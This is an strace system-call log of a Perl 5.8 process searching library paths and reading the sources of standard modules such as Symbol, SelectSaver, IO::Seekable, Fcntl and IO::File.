11808 20:20:26.880791 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
11808 20:20:26.881248 read(8, "", 4096) = 0
11808 20:20:26.881279 close(8)          = 0
11808 20:20:26.881346 stat64("/etc/perl/SelectSaver.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.881363 stat64("/etc/perl/SelectSaver.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.881377 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.881390 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.881404 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.881421 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.881435 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.881447 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.881460 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.881472 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.881486 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.881498 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.881512 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.881525 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
11808 20:20:26.881546 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
11808 20:20:26.881561 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e318) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:26.881572 _llseek(8, 0, [0], SEEK_CUR) = 0
11808 20:20:26.881591 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
11808 20:20:26.881774 brk(0x81d6000)    = 0x81d6000
11808 20:20:26.881827 read(8, "", 4096) = 0
11808 20:20:26.881839 close(8)          = 0
11808 20:20:26.882141 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
11808 20:20:26.882598 read(6, "", 4096) = 0
11808 20:20:27.049049 close(6)          = 0
11808 20:20:27.049049 stat64("/etc/perl/IO/Seekable.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.049049 stat64("/etc/perl/IO/Seekable.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.049062 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.049076 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.049090 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.049103 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.049116 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.049128 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.049142 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.049154 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.049167 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.049181 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
11808 20:20:27.049203 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
11808 20:20:27.049220 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e7c8) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:27.049233 _llseek(6, 0, [0], SEEK_CUR) = 0
11808 20:20:27.049252 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
11808 20:20:27.049496 stat64("/etc/perl/Fcntl.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.049549 stat64("/etc/perl/Fcntl.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.049563 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.049576 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.049590 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.049602 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.049616 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.049627 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.049640 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.049652 stat64("/usr/share/perl5/Fcntl.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.049665 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.049677 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
11808 20:20:27.049697 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
11808 20:20:27.049711 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e318) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:27.049723 _llseek(8, 0, [0], SEEK_CUR) = 0
11808 20:20:27.049742 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
11808 20:20:27.050207 brk(0x81f7000)    = 0x81f7000
11808 20:20:27.050468 read(8, "", 4096) = 0
11808 20:20:27.050499 close(8)          = 0
11808 20:20:27.050584 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
11808 20:20:27.050611 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
11808 20:20:27.050644 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
11808 20:20:27.050660 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
11808 20:20:27.050767 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
11808 20:20:27.050787 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7db0000
11808 20:20:27.050803 mmap2(0xb7db3000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7db3000
11808 20:20:27.050866 close(8)          = 0
11808 20:20:27.051137 read(6, "", 4096) = 0
11808 20:20:27.051153 close(6)          = 0
11808 20:20:27.051188 stat64("/etc/perl/IO/File.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.051205 stat64("/etc/perl/IO/File.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.051222 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.051239 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.051258 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.051276 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.051296 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.051439 stat64("/usr/lib/perl5/IO/File.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.051475 stat64("/usr/share/perl5/IO/File.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.051494 stat64("/usr/share/perl5/IO/File.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.051515 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.051546 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
11808 20:20:27.051580 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
11808 20:20:27.051602 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e7c8) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:27.051619 _llseek(6, 0, [0], SEEK_CUR) = 0
11808 20:20:27.051647 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
11808 20:20:27.052030 stat64("/etc/perl/File/Spec.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.052051 stat64("/etc/perl/File/Spec.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052066 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.052081 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052097 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.052112 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052128 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.052142 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052157 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.052171 stat64("/usr/share/perl5/File/Spec.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052186 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.052205 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.052222 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.052237 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
11808 20:20:27.052262 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
